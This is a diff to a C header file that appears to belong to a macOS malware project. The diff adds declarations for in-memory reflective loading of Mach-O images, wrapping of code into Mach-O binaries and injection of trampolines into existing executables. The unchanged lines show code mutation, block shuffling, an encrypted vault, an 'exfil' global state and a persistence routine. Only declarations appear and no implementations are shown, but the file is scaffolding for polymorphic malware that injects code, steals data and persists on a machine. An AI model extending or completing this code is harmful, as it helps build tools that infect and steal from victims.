@@ -37,7 +37,10 @@
 #include <mach-o/getsect.h>
 #include <mach-o/fat.h>
 #include <mach/mach_time.h>
+#include <mach/vm_region.h>
+#include <mach/vm_map.h>
 #include <Security/SecRandom.h>
+#include <pthread.h>
 
 #include <openssl/rsa.h>
 #include <openssl/evp.h>
@@ -66,7 +69,6 @@
 /* Macros */
 #define KEY_SIZE 32
 #define IV_SIZE 16
-#define IV_SIZE  16
 #define _CAPZ 1024
 #define NOFFSET__ UINT64_MAX
 #define _CVZ 64
@@ -75,8 +77,20 @@
 #define _FIN 0.7f
 #define _ZMAX 65536
 #define _CAP(size) ((size) / 100 + 1)
-#define PS_Z 4096
-#define M_FL 100 
+#define LOADED_IMAGES 16
+#define PS_Z 4096 
+#define M_FL 100
+
+#define PAGE_SIZE_64 0x4000  // PS_Z
+#define ALIGN_PAGE(x) (((x) + PAGE_SIZE_64 - 1) & ~(PAGE_SIZE_64 - 1))
+#define ALIGN_8(x) (((x) + 7) & ~7)
+
+#ifndef MIN
+#define MIN(a, b) ((a) < (b) ? (a) : (b))
+#endif
+#ifndef MAX
+#define MAX(a, b) ((a) > (b) ? (a) : (b))
+#endif 
 
 /* DEBUG=1 (FOO flag) */
 #ifdef FOO
@@ -438,10 +452,7 @@ typedef struct {
     uint8_t *backup;
 } tramp_backup_t;
 
-typedef struct {
-    size_t start;
-    size_t end;
-} cave_t;
+
 
 /* Semantic */
 typedef struct {
@@ -519,9 +530,7 @@ typedef struct {
 typedef struct {
     uint8_t *ogicode;
     uint8_t *working_code;
-    size_t codesz;
-    size_t num_caves;
-    cave_t caves[_CVZ]; 
+    size_t codesz; 
     size_t buffcap;
     flowmap cfg;
     muttt_t muttation;
@@ -610,6 +619,52 @@ typedef struct {
     uint8_t data[128];
 } enc_vault_t;
 
+typedef struct {
+    void *base;              
+    size_t size;            
+    struct mach_header_64 *header;
+    void *entry_point;      
+    bool loaded;            
+    uint8_t *original_data; 
+    uint64_t slide;         
+    uint64_t min_vmaddr;     
+    bool has_relocations;   
+    pthread_t entry_thread;  
+    bool entry_running;     
+} image_t;
+
+typedef struct {
+    // Header
+    struct mach_header_64 header;
+    
+    // Load commands
+    struct segment_command_64 pagezero_segment;
+    struct segment_command_64 text_segment;
+    struct section_64 text_section;
+    struct segment_command_64 linkedit_segment;
+    struct symtab_command symtab_cmd;
+    struct dysymtab_command dysymtab_cmd;
+    struct entry_point_command entry_cmd;
+    
+    // Padding to align code
+    uint8_t padding[256];
+} __attribute__((packed)) macho_header_t;
+
+typedef struct {
+    uint8_t *buffer;
+    size_t size;
+    size_t capacity;
+    
+    // Offsets within buffer
+    size_t header_size;
+    size_t code_offset;
+    size_t code_size;
+    size_t symtab_offset;
+    size_t strtab_offset;
+    size_t strtab_size;
+} macho_builder_t;
+
+
 // Global state for exfil
 extern char *_strings[8];
 extern file_t *files[M_FL];
@@ -692,6 +747,20 @@ void shuffle_blocks(uint8_t *code, size_t size, void *rng);
 bool is_chunk_ok(const uint8_t *chunk, size_t max_len);
 bool is_op_ok(const uint8_t *op);
 size_t snap_len(const uint8_t *buf, size_t maxlen);
+
+// Mach-O 
+uint8_t* wrap_macho(const uint8_t *code, size_t code_size, size_t *out_size);  
+bool V_machO(const uint8_t *data, size_t size);
+
+// Injection
+bool inject_tramps(const char *binary_path,
+                                   context_t *ctx,
+                                   uint8_t *mutated_code,
+                                   size_t mutated_size);
+
+// Reflective loading
+bool exec_mem(uint8_t *data, size_t size);
+image_t* load_image(uint8_t *data, size_t size);  
 
 // Persistence
 int persist(void);
